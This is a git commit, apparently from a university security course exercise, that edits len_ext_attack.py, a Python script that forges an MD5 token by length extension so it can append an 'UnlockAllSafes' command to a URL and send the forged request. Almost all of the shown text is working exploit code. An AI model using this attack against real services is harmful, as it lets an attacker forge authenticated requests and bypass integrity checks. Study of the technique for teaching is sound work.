dd3523d58a6f19ba7289448727a5716b2a0de26d
blklein <blklein@umich.edu>
2018-01-16 16:56:20 -0500

    invalid token

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -1,13 +1,14 @@
 from  pymd5 import md5, padding
 import httplib, urlparse, urllib, sys
 
-url = sys.argv[1]
+url = urllib.quote(sys.argv[1])
 
-idx1 = url.find("token=")
-idx2 = url.find("user=")
 
-url1 = url[:idx1+6]
-token = url[idx1+6:idx2]
+idx1 = url.find("token%3D")
+idx2 = url.find("%26user%3D")
+
+url1 = url[:idx1+8]
+token = url[idx1+8:idx2]
 url2 = url[idx2:len(url)]
 
 x = "&command3=UnlockAllSafes"
@@ -16,14 +17,21 @@ url2 = url2 + x
 l_of_m = 8 + len(url2)
 bits = (l_of_m + len(padding(l_of_m*8)))*8
 
-h = md5(state=urllib.quote(token.strip().decode("hex")), count=bits)
+
+h = md5(state=(token).decode("hex"), count=bits)
+
+x += urllib.quote(padding((l_of_m + len(x)) * 8))
+
+
 
 h.update(x)
+
 new_token = h.hexdigest()
 
 new_url = url1 + new_token + url2
-
-parsedUrl = urlparse.urlparse(new_url)
+#print urllib.unquote(url)
+#print urllib.unquote(new_url)
+parsedUrl = urlparse.urlparse(urllib.unquote(new_url))
 conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
 conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
 print conn.getresponse().read()
